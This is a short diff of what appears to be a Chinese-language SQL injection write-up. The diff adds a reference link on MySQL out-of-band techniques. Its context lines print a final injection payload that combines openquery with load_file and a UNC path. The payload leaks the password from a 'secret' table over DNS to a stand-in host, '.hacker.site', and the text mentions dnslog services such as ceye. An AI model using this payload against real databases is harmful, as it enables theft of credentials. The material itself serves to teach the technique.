@@ -36,3 +36,5 @@ if ( @$row = $stmt->fetch( PDO::FETCH_ASSOC ) ){
 最终的payload: `/?id=1 union select * from openquery(mysql,'select load_file(concat("\\\\",(select password from secret),".hacker.site\\a.txt"))')`
 
 dnslog 平台可以自己搭也可以用ceye
+
+[mysql out of band](http://www.mottoin.com/96463.html)
